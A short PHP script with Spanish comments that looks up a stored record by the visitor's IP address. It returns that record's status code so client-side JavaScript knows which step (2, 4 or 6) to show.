<?php
require_once('../panel/lib/funciones.php');
$ip = $_SERVER['REMOTE_ADDR'];

if (function_exists('traer_regitro')) {
    $registro = traer_regitro($ip);
    if ($registro) {
        echo trim($registro['estado']); // Esto le dirá al JS si ir a 2, 4 o 6
    } else {
        echo "0";
    }
} else {
    echo "0";
}
?>
